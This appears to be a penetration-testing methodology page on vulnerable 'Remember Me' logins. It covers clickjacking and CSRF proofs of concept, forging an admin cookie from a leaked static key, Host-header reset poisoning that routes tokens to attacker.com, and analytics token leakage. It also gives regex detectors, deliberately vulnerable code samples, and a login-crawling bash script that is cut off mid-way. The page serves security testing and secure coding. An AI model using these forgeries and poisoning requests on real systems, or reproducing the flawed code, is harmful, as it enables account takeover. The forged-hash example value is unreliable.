# Vulnerable Remember Password

## Check List

* [ ] Validate that the generated session is managed securely and do not put the user’s credentials in danger.

## Methodology

### Black Box

#### Trigger the Passwordless / Remember Me Login

{% stepper %}
{% step %}
Register or log in normally
{% endstep %}

{% step %}
Tick "`Remember me`", "`Stay logged in`", or use "`Sign in with this device`"
{% endstep %}

{% step %}
Complete login → Note you are logged in
{% endstep %}

{% step %}
Open DevTools → Application → Local Storage / Session Storage / IndexedDB
{% endstep %}

{% step %}
Search for `password`, `cred`, `token`, `user`, `email`
{% endstep %}

{% step %}
If `plain/encoded/base64` credentials found → Credential leak confirmed
{% endstep %}

{% step %}
then go to DevTools → Application → Cookies
{% endstep %}

{% step %}
Look for session cookie with no or very long `Expires/Max-Age` (1 year, "Session" but never expires)
{% endstep %}
{% endstepper %}

***

#### Clickjacking on Auto-Login Page

{% stepper %}
{% step %}
Frame the login/auto-auth page

```html
<iframe src="https://target.com/auto-login" style="opacity:0.1"></iframe>
```
{% endstep %}

{% step %}
If auto-login triggers in iframe → Clickjacking Possible
{% endstep %}
{% endstepper %}

***

#### CSRF on Auto-Auth Flow

{% stepper %}
{% step %}
Craft CSRF PoC that visits the auto-login endpoint

```html
<img src="https://target.com/remembered-login-endpoint">
```
{% endstep %}

{% step %}
If victim visits → Automatically logged in as you → CSRF confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Deterministic "Remember Me" Cookie Forgery via Static Key Generation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on the authentication portal and enable the "Remember Me" or "Keep me logged in" checkbox during a legitimate login
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Extract the generated persistent cookie (e.g., `remember_me`, `persistent_session`)
{% endstep %}

{% step %}
Analyze the Cookie Structure. Use a decoder to evaluate the token. Often, developers avoid stateful database tracking for persistent sessions by encoding the state directly into the cookie using Base64
{% endstep %}

{% step %}
Identify the "Deterministic Cryptography" architecture. The decoded string frequently reveals a delimited format, such as `username:expiration_timestamp:signature`
{% endstep %}

{% step %}
Investigate the Signature generation logic. To validate the cookie upon the user's return, the backend must mathematically verify the signature. If the developer uses a weak hashing algorithm (e.g., MD5 or SHA1) combined with static, easily guessable data (e.g., `Hash(username + expiration_timestamp + static_secret_key)`), the entire token becomes deterministic
{% endstep %}

{% step %}
Discover the fatal cryptographic flaw: If the application uses a hardcoded, weak, or publicly leaked "Secret Key" (often found in open-source framework defaults, public GitHub repositories, or deduced via brute-force if the secret is short), the attacker can independently generate mathematically valid signatures
{% endstep %}

{% step %}
Understand the vulnerability: The attacker does not need the victim's password. They only need to know the victim's username and the static secret key
{% endstep %}

{% step %}
Formulate the Cookie Forgery payload. Choose a highly privileged victim username (e.g., `admin`)
{% endstep %}

{% step %}
Calculate a future expiration timestamp (e.g., Unix Epoch time for 30 days from now)
{% endstep %}

{% step %}
Compute the forged signature offline using the compromised secret key: `MD5("admin" + "1800000000" + "EnterpriseSecretKey123")`
{% endstep %}

{% step %}
Construct the final string: `admin:1800000000:<Forged_Hash>`
{% endstep %}

{% step %}
Base64 encode the string
{% endstep %}

{% step %}
Inject the forged Base64 payload into your browser's `remember_me` cookie
{% endstep %}

{% step %}
Navigate to the enterprise dashboard. The backend intercepts the cookie, decodes it, recalculates the hash using its internal secret key, and finds a perfect match. The application authenticates you as the administrator without ever evaluating a password

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Convert\.ToBase64String\(Encoding\.UTF8\.GetBytes\(\$"\{username\}:)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(new\s+Cookie\(['"]remember_me['"],\s*Base64\.encode)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(setcookie\(['"]remember_me['"],\s*base64_encode)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(Buffer\.from\(`\$\{user\.username\}:\$\{expiration\}:\$\{hash\}`\)\.toString\(['"]base64['"]\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"Convert\.ToBase64String\(Encoding\.UTF8\.GetBytes\(\\$\"\{username\}:"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"new\s+Cookie\(['\"]remember_me['\"],\s*Base64\.encode"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"setcookie\(['\"]remember_me['\"],\s*base64_encode"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"Buffer\.from\(`\\$\\{user\.username\\}:\\$\\{expiration\\}:\\$\\{hash\\}`\)\.toString\(['\"]base64['\"]\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/auth/login")]
public IActionResult Login([FromBody] LoginDto req)
{
    var user = _authService.Validate(req.Username, req.Password);
    if (user != null && req.RememberMe)
    {
        // [1]
        // [2]
        var expiration = DateTimeOffset.UtcNow.AddDays(30).ToUnixTimeSeconds();
        string secret = _configuration["RememberMeSecret"]; // e.g., "secret123"

        // [3]
        // [4]
        // Concatenating predictable values to form a deterministic token
        string dataToHash = $"{user.Username}:{expiration}:{secret}";
        string hash = ComputeSha256(dataToHash);

        string cookieData = $"{user.Username}:{expiration}:{hash}";
        string base64Cookie = Convert.ToBase64String(Encoding.UTF8.GetBytes(cookieData));

        Response.Cookies.Append("remember_me", base64Cookie);
        return Ok();
    }
    return Unauthorized();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
                .anyRequest().authenticated()
                .and()
            .formLogin()
                .and()
            // [1]
            // [2]
            // [3]
            // [4]
            // Using TokenBasedRememberMeServices instead of PersistentTokenBasedRememberMeServices.
            // If the key is weak or leaked, attackers can forge cookies for any user.
            .rememberMe()
                .key("myAppSecretKey") 
                .tokenValiditySeconds(86400);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class AuthController extends Controller
{
    public function login(Request $request)
    {
        if (Auth::attempt($request->only('username', 'password')) && $request->remember) {
            $username = $request->input('username');
            $expire = time() + (86400 * 30);
            $secret = env('REMEMBER_ME_SECRET', 'default_secret');

            // [1]
            // [2]
            // [3]
            // [4]
            // Predictable generation without database persistence
            $hash = md5($username . $expire . $secret);
            $cookieValue = base64_encode($username . ':' . $expire . ':' . $hash);

            setcookie('persistent_session', $cookieValue, $expire, "/", "", true, true);
        }
        return response()->json(['status' => 'success']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const crypto = require('crypto');
const SECRET_KEY = "EnterpriseSecretKey123"; // Leaked or easily guessable

router.post('/api/v1/auth/login', async (req, res) => {
    const user = await authenticate(req.body.username, req.body.password);
    
    if (user && req.body.rememberMe) {
        // [1]
        // [2]
        const expiration = Date.now() + (30 * 24 * 60 * 60 * 1000);
        
        // [3]
        // [4]
        // Fatal Flaw: The hash relies entirely on predictable data and a static secret.
        // There is no dynamic, database-stored token.
        const signature = crypto.createHash('md5')
            .update(`${user.username}:${expiration}:${SECRET_KEY}`)
            .digest('hex');
            
        const cookieValue = Buffer.from(`${user.username}:${expiration}:${signature}`).toString('base64');
        
        res.cookie('remember_me', cookieValue, { httpOnly: true, maxAge: expiration });
    }
    res.send("Logged in");
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture offers persistent sessions ("Remember Me") to improve user experience, allowing authentication to survive browser restarts without requiring continuous credential input, \[2] To avoid database I/O overhead (e.g., maintaining a `remember_me_tokens` table), developers opt for a stateless, purely cryptographic cookie implementation, \[3] The architecture relies on standard string concatenation and basic hashing algorithms to generate the cryptographic signature verifying the cookie's integrity, \[4] The execution sink. The developers failed to incorporate a dynamic, user-specific salt (like the user's password hash from the database) into the signature generation. Because the entire cryptographic integrity relies on a single, global static secret, the system is fundamentally brittle. If an attacker discovers or brute-forces this static secret, they gain the capability to mathematically synthesize valid authentication artifacts for any user across the entire platform. By forging the cookie locally and presenting it to the server, the attacker forces the backend to mathematically validate its own broken cryptography, culminating in unauthenticated Account Takeover

```http
// 1. Attacker decompiles the mobile app or finds a public GitHub repo to extract the secret key: "AppSec2026!"
// 2. Attacker wants to compromise the "admin" account.
// 3. Attacker runs a local script to forge the token:
//    time = 1800000000
//    hash = md5("admin" + ":" + "1800000000" + ":" + "AppSec2026!") -> "5f4dcc3b5aa765d61d8327deb882cf99"
//    payload = base64("admin:1800000000:5f4dcc3b5aa765d61d8327deb882cf99") -> "YWRtaW46MTgwMDAwMDAwMDo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OQ=="

// 4. Attacker navigates to the target application and injects the forged cookie.
GET /api/v1/admin/dashboard HTTP/1.1
Host: api.enterprise.tld
Cookie: remember_me=YWRtaW46MTgwMDAwMDAwMDo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OQ==

// 5. The backend middleware decodes the cookie.
// 6. It verifies the hash using its internal "AppSec2026!" key. The hashes match perfectly.
// 7. The backend establishes a live, authenticated session for "admin".

HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "Welcome Admin",
  "data": { "total_revenue": "$4,500,000" }
}
```
{% endstep %}

{% step %}
To eliminate relational database dependencies for persistent sessions, backend engineers engineered stateless "Remember Me" tokens relying entirely on cryptographic signatures. This architecture entrusted organizational security to the secrecy of a solitary, globally shared key. The systemic failure materialized when developers omitted user-specific entropy from the hashing sequence. By utilizing predictable inputs (username and timestamp) combined with a static secret, they created a deterministic cryptographic formula. The attacker exploited this mathematical predictability. Having acquired the global secret via open-source intelligence or reverse engineering, the attacker operated entirely offline, synthesizing a perfectly formatted, mathematically valid session token for a highly privileged target. The backend, evaluating only the structural integrity of the signature rather than its issuance provenance, blindly honored the forged artifact, executing a complete authentication bypass
{% endstep %}
{% endstepper %}

***

#### Password Reset Poisoning via Unvalidated `Host` Header Reflection

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on the "Forgot Password" or "Account Recovery" flow (`POST /api/v1/auth/forgot-password`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the email generation and URL synthesis pipeline
{% endstep %}

{% step %}
Identify the "Dynamic URL Generation" architecture. When an application generates an email containing a password reset link, it must construct an absolute URL (e.g., `[https://enterprise.tld/reset?token=123](https://enterprise.tld/reset?token=123)`). Because enterprise codebases are deployed across multiple environments (staging, QA, production), developers avoid hardcoding `[https://enterprise.tld](https://enterprise.tld)` in the codebase
{% endstep %}

{% step %}
Investigate the Base URL resolution. To dynamically generate the absolute URL, the backend framework parses the incoming HTTP request that triggered the password reset. It extracts the domain name directly from the HTTP `Host` header (or `X-Forwarded-Host` if behind a proxy)
{% endstep %}

{% step %}
Analyze the extraction boundary. The developer concatenates this dynamically extracted Host value with the secure token: `$"https://{Request.Host}/reset?token={SecureToken}"`
{% endstep %}

{% step %}
Discover the fatal trust assumption: The developer explicitly assumes that the HTTP `Host` header is immutable and rigidly controlled by the API Gateway or DNS routing infrastructure. They fail to understand that a client can artificially modify the `Host` header in their raw HTTP request
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker intercepts the "Forgot Password" request and changes the `Host` header to an attacker-controlled domain, the backend framework obediently utilizes the malicious domain to construct the password reset URL
{% endstep %}

{% step %}
Formulate the Reset Poisoning payload
{% endstep %}

{% step %}
Identify the target victim's email address (e.g., `ceo@enterprise.tld`)
{% endstep %}

{% step %}
Initiate a password reset request for the victim
{% endstep %}

{% step %}
In Burp Suite, intercept the outgoing `POST /api/v1/auth/forgot-password` request
{% endstep %}

{% step %}
Modify the `Host` header: Change `Host: api.enterprise.tld` to `Host: attacker.com`. (If the server rejects a modified `Host` header, try injecting `X-Forwarded-Host: attacker.`
{% endstep %}

{% step %}
Transmit the request. The backend receives the request. It generates a secure, cryptographically random reset token (`abc-123`)
{% endstep %}

{% step %}
The backend builds the email body: `Click here to reset: [https://attacker.com/reset?token=abc-123](https://attacker.com/reset?token=abc-123)`
{% endstep %}

{% step %}
The enterprise server dispatches the email to the victim via SendGrid or AWS SES
{% endstep %}

{% step %}
The victim receives an official, trusted email directly from `noreply@enterprise.tld`. Because the email originates from the legitimate corporate server, it easily bypasses spam filters
{% endstep %}

{% step %}
The victim, possibly confused or believing their account is at risk, clicks the link
{% endstep %}

{% step %}
The victim's browser navigates to `[https://attacker.com/reset?token=abc-123](https://attacker.com/reset?token=abc-123)`. The attacker logs the token, navigates to the legitimate enterprise platform, inputs the stolen token, resets the victim's password, and assumes total control of the account

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Request\.Host\.Value)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(ServletUriComponentsBuilder\.fromCurrentContextPath)|(request\.getHeader\("Host"\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$request->getHost\(\))|(\$_SERVER\['HTTP_HOST'\])
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(req\.headers\['host'\])|(req\.get\(['"]host['"]\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"Request\.Host\.Value"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"ServletUriComponentsBuilder\.fromCurrentContextPath|request\.getHeader\(\"Host\"\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"\\$request->getHost\(\)|\\$_SERVER\['HTTP_HOST'\]"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"req\.headers\['host'\]|req\.get\(['\"]host['\"]\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/auth/forgot-password")]
public async Task<IActionResult> ForgotPassword([FromBody] ForgotPasswordDto req)
{
    var user = await _userManager.FindByEmailAsync(req.Email);
    if (user != null)
    {
        var token = await _userManager.GeneratePasswordResetTokenAsync(user);
        
        // [1]
        // [2]
        // Fatal Flaw: Dynamically reading the Host header from the untrusted HTTP request 
        // to construct the password reset URL.
        // [3]
        // [4]
        var resetLink = $"https://{Request.Host.Value}/auth/reset-password?token={token}";
        
        await _emailService.SendEmailAsync(user.Email, "Reset Password", $"Click here: {resetLink}");
    }
    
    // Always return Ok to prevent user enumeration
    return Ok("If the email exists, a reset link was sent.");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/auth/forgot-password")
public ResponseEntity<?> forgotPassword(@RequestBody EmailRequest req) {
    User user = userService.findByEmail(req.getEmail());
    
    if (user != null) {
        String token = tokenService.createResetToken(user);
        
        // [1]
        // [2]
        // [3]
        // [4]
        // ServletUriComponentsBuilder implicitly reads the Host/X-Forwarded-Host headers
        // from the current HTTP request context to build the absolute URL.
        String resetUrl = ServletUriComponentsBuilder.fromCurrentContextPath()
                .path("/reset-password")
                .queryParam("token", token)
                .build().toUriString();
                
        emailSender.send(user.getEmail(), resetUrl);
    }
    return ResponseEntity.ok().build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class PasswordResetController extends Controller
{
    public function sendResetLink(Request $request)
    {
        $user = User::where('email', $request->email)->first();

        if ($user) {
            $token = Password::createToken($user);

            // [1]
            // [2]
            // Laravel's url() helper dynamically utilizes the incoming request's Host header.
            // If the server doesn't enforce strict host routing, this causes poisoning.
            // [3]
            // [4]
            $resetUrl = url("/reset-password?token={$token}");

            Mail::to($user->email)->send(new ResetPasswordMail($resetUrl));
        }

        return response()->json(['status' => 'Email sent']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/auth/forgot-password', async (req, res) => {
    const user = await User.findOne({ email: req.body.email });
    
    if (user) {
        const resetToken = generateSecureToken();
        await saveTokenToDatabase(user.id, resetToken);

        // [1]
        // [2]
        // req.get('host') explicitly pulls from the HTTP Host header.
        // If an attacker sends X-Forwarded-Host or alters Host, the URL is poisoned.
        // [3]
        // [4]
        const host = req.get('host');
        const resetUrl = `https://${host}/reset-password?token=${resetToken}`;

        await sendEmail(user.email, resetUrl);
    }
    
    res.send("Check your email");
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes password recovery workflows, requiring the generation and dispatch of highly sensitive, time-limited cryptographic tokens via out-of-band communication channels (email), \[2] To support seamless deployments across multiple environmental tiers (Dev, QA, UAT, Prod) without maintaining disparate configuration files, developers utilize dynamic URL resolution, \[3] The architecture relies on the underlying web framework to extract the application's base domain directly from the incoming HTTP request context (`Host` or `X-Forwarded-Host` headers), \[4] The execution sink. Developers erroneously equated network routing telemetry with immutable application state. The `Host` header is a client-controlled input vector, completel

```http
// 1. Attacker initiates the forgot password flow for the CEO's email.
// 2. Attacker intercepts the POST request.
// 3. Attacker alters the Host header to their own domain.

POST /api/v1/auth/forgot-password HTTP/1.1
Host: secure-enterprise-login.attacker.com
Content-Type: application/json

{"email": "ceo@enterprise.tld"}

// 4. The enterprise backend processes the request.
// 5. It generates a valid reset token (Token: 99887766).
// 6. It dynamically constructs the email using the attacker's Host header.
// 7. Email Content: "Hello, click here to reset your password: https://secure-enterprise-login.attacker.com/auth/reset-password?token=99887766"
// 8. The enterprise SMTP server sends the email.

// 9. The CEO receives the email. It passes SPF/DKIM/DMARC because it physically 
//    came from the real enterprise server.
// 10. The CEO clicks the link.
// 11. The attacker's server logs the incoming GET request: 
//     GET /auth/reset-password?token=99887766
// 12. The attacker instantly uses the intercepted token against the real API to change the password.
```
{% endstep %}

{% step %}
To eliminate static configuration drift across multiple deployment environments, infrastructure engineers implemented dynamic navigational synthesis for outgoing communications. This design relied on parsing the HTTP transport layer to contextually determine the application's origin domain. The security vulnerability emerged from a failure to validate the structural integrity of the `Host` header against a rigid, server-side whitelist. Developers assumed the `Host` header was an authoritative artifact generated by the DNS and load-balancing infrastructure. The attacker exploited this false equivalence by overriding the transport envelope during the initial request phase. The backend framework, obediently following its dynamic synthesis logic, interpolated the attacker's hostile domain into the highly sensitive recovery payload. This orchestrated a highly credible Social Engineering attack, weaponizing the enterprise's own authenticated SMTP relays to deliver a hijacked cryptographic recovery link directly to the victim
{% endstep %}
{% endstepper %}

***

#### Token Exfiltration via Referer Leakage and Third-Party Analytics Synchronization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on the frontend architecture of the Password Reset or "Magic Link" authentication flows (e.g., navigating to `[https://enterprise.tld/auth/reset?token=XYZ](https://enterprise.tld/auth/reset?token=XYZ)`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend Single Page Application (SPA) tracking dependencies (e.g., Google Analytics, Meta Pixel, Segment, FullStory, or custom marketing integrations)
{% endstep %}

{% step %}
Identify the "URL Parameter Authorization" architecture. The enterprise issues a secure password reset link containing a cryptographic token directly within the URI Query String (`?token=XYZ`)
{% endstep %}

{% step %}
Investigate the Client-Side operational environment. When the victim clicks the reset link in their email, their browser opens the enterprise platform and renders the Password Reset&#x20;
{% endstep %}

{% step %}
Analyze the Third-Party data ingestion logic. Modern enterprise applications are heavily instrumented. The moment the page loads, marketing and analytics scripts execute. These scripts explicitly read `window.location.href` to track user journeys, page views, and conversion funnels
{% endstep %}

{% step %}
Discover the fatal architectural leakage: The developers successfully implemented a highly secure token generation backend. However, because the token resides in the active URL Query String during the frontend rendering phase, it is entirely exposed to the DOM's global execution context
{% endstep %}

{% step %}
Understand the vulnerability: The analytics scripts indiscriminately harvest the entire URL—including the highly sensitive `?token=XYZ` parameter—and continuously broadcast it to external, third-party databases. Furthermore, if the page contains external links (e.g., a link to a generic support forum or a partner site) and lacks strict `Referrer-Policy` headers, clicking those links will transmit the exact URL containing the token via the HTTP `Referer` header to external web servers
{% endstep %}

{% step %}
Formulate the Token Exfiltration strategy. This is an architectural observation attack rather than an active injection
{% endstep %}

{% step %}
Trigger a password reset link for your own account and click it
{% endstep %}

{% step %}
Observe the network traffic in Burp Suite's HTTP History. Filter by traffic destined for external domains (e.g., `[google-analytics.com/collect](https://google-analytics.com/collect)`, `api.segment.io/v1/p`)
{% endstep %}

{% step %}
Inspect the JSON payloads transmitted to these external services. You will discover the complete, un-hashed password reset token sitting in plaintext within the `url` or `page` properties of the analytical payload
{% endstep %}

{% step %}
The enterprise has successfully exported its most critical cryptographic recovery keys into massive, multi-tenant marketing databases accessed by dozens of non-security personnel, creating a catastrophic perimeter violation

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
(path\s*:\s*['"]/reset-password['"],\s*component)|(window\.location\.search)|(\?token=)|(ga\('send',\s*'pageview'\))|(Segment\.page\(\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
"path\s*:\s*['\"]/reset-password['\"],\s*component|window\.location\.search|\?token=|ga\('send',\s*'pageview'\)|Segment\.page\(\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
// React/Vue Router Configuration
const routes = [
    // [1]
    // [2]
    // The developer places the sensitive token in the Query String rather than the URL Fragment (#)
    { path: '/reset-password', component: ResetPasswordView }
];

// Global Analytics Middleware executing on every page load
router.afterEach((to, from) => {
    // [3]
    // [4]
    // Fatal Flaw: The analytics payload harvests the absolute URL path and query string.
    // If the route is /reset-password?token=a1b2c3d4, the token is shipped 
    // to a third-party server.
    const fullUrl = window.location.origin + to.fullPath;
    
    // Broadcasts the token to external marketing servers
    ThirdPartyAnalytics.trackPageView({
        url: fullUrl,
        timestamp: Date.now()
    });
});

// Inside ResetPasswordView.js
// The developer extracts the token to submit to the API.
const urlParams = new URLSearchParams(window.location.search);
const token = urlParams.get('token');
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies on asynchronous, out-of-band communication (email) to deliver cryptographic recovery artifacts to users attempting to regain access, \[2] To orchestrate the frontend flow, the architecture embeds the recovery artifact directly into the HTTP Request's Query String (`?token=`), directing the browser to the application's recovery module, \[3] The enterprise heavily instruments its client-side interfaces with robust telemetry and marketing SDKs to trace user behavior and optimize conversion funnels, \[4] The execution sink. Developers isolated their threat models, treating the backend generation of the token as the sole security perimeter. They failed to account for the hostile, heavily surveilled nature of the modern DOM execution environment. By placing the cryptographic token within the standard HTTP Query String rather than a URL Fragment (`#token=`, which is not transmitted to servers), they exposed the artifact to all active JavaScript agents and HTTP Referral mechanisms. The third-party analytics scripts, operating precisely as designed, harvested the navigation state and unilaterally exported the un-redacted cryptographic keys across the internet. This systemic architectural leakage degrades enterprise authentication artifacts into globally syndicated marketing telemetry

```http
// 1. Victim initiates a password reset and clicks the link in their email:
//    https://app.enterprise.tld/auth/reset-password?token=90a8b7c6-5d4e-3f2g-1h0i

// 2. The browser renders the SPA. The React/Vue router parses the URL.
// 3. Simultaneously, the global tracking snippet initializes.

// 4. The browser automatically fires an outbound XHR/Beacon request to an external marketing platform:

POST /v1/t HTTP/1.1
Host: api.segment.io
Content-Type: application/json

{
  "type": "page",
  "name": "Password Reset",
  "properties": {
    "title": "Reset Your Password",
    "url": "https://app.enterprise.tld/auth/reset-password?token=90a8b7c6-5d4e-3f2g-1h0i",
    "path": "/auth/reset-password",
    "search": "?token=90a8b7c6-5d4e-3f2g-1h0i"
  }
}

// 5. The plaintext password reset token is now permanently indexed inside the third-party marketing database.
// 6. Anyone with access to the Segment/Google Analytics dashboard (marketing interns, external contractors, 
//    or an attacker who compromised the marketing platform) can simply query the logs for "?token=" 
//    and harvest live password reset tokens to hijack enterprise accounts.
```
{% endstep %}

{% step %}
To streamline account recovery, engineers transmitted cryptographic reset artifacts via standard URL query parameters. Simultaneously, to drive business intelligence, frontend architects embedded aggressive user-tracking telemetry across all Single Page Application routes. The security failure materialized from an architectural collision between credential delivery mechanics and aggressive client-side observation pipelines. Developers assumed the URL was an ephemeral navigational state restricted to the user's local browser. They fundamentally ignored the fact that global analytics SDKs are explicitly designed to harvest, serialize, and export the entire Document Object Model's state matrix. Because the token resided in the observable Query String rather than the protected URL Fragment (`#`), the embedded SDKs autonomously swept up the cryptographic artifacts. This configuration unwittingly transformed the enterprise's highly secure account recovery perimeter into a massive, automated data-leakage pipeline, systematically depositing master authentication keys into low-security, third-party marketing databases
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### Click Jacking <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [cURL](https://curl.se/)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano rp-clickjacking.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 3 ]; then
    echo "Usage: $0 <domain.com> <username> <password>"
    exit 1
fi

# arguments
URL="$1"
USER="$2"
PASS="$3"
DEPS="git curl golang jq"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        apt install -y "$pkg"
        color_print GREEN "[+] $pkg installed"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
    color_print GREEN "[+] katana installed"
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    color_print RED "[X] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA"; then
    color_print RED "[X] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# Remember password / Remember me checkbox
REMEMBER_FIELD=""
REMEMBER_VALUE="on"
REMEMBER_INPUT=$(echo "$FORM" | grep -oiE '<input[^>]+>' | grep -iE 'type=["'\'']?checkbox["'\'']?' | \
    grep -iE 'name=["'\'']?[^"'\'' ]*(remember|remember_me|rememberme|stay_logged|persist|keep[^"'\'']*login)' | head -1)

if [ -n "$REMEMBER_INPUT" ]; then
    REMEMBER_FIELD=$(echo "$REMEMBER_INPUT" | grep -oiE 'name=["'\'']?\K[^"'\'' ]+')
    REMEMBER_VAL_ATTR=$(echo "$REMEMBER_INPUT" | grep -oiE 'value=["'\'']?\K[^"'\'' ]+')
    [ -n "$REMEMBER_VAL_ATTR" ] && REMEMBER_VALUE="$REMEMBER_VAL_ATTR"
fi

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')

while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
